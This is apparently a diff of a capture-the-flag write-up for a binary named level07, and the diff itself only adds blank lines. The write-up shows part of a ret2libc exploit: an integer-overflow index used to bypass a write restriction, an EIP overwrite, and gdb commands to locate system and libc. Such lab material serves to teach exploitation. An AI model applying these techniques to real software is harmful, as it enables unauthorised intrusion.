@@ -20,9 +20,11 @@ We decide to perform a RET2LIBC to gain shell execution.
 ### Gathering infos to build the payload
 
 **How to Write on index that are Multiples of 3**
+
 To write to an index which are multiples of 3, we'll exploit integer overflow, using a number that isn't itself a multiple of 3.
 
 **Finding EIP**
+
 Through experimentation, at index 114, we discover the number 4158936339, which translates to F7E45513 in hexadecimal. This looks like an address, likely the EIP.
 ````
 Input command: read
@@ -37,6 +39,7 @@ This isn't a multiple of 3, perfect!
 
 
 **Testing our EIP Overwrite Theory**
+
 Input command: **store**
  Number: **666**
  Index: **2147483762**
@@ -50,6 +53,7 @@ Input command: quit
 --> Great! We have a segmentation fault, which means we successfully overwrote the EIP.
 
 **Locating the 'system' Address**
+
 ``gdb ./level07``
 ``(gdb) b main``
 [...]
@@ -60,6 +64,7 @@ Input command: quit
 >0xf7e6aed0  system
 
 **Finding "/bin/sh" in Memory**
+
 ``(gdb) info proc map''
 [...]
 >0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
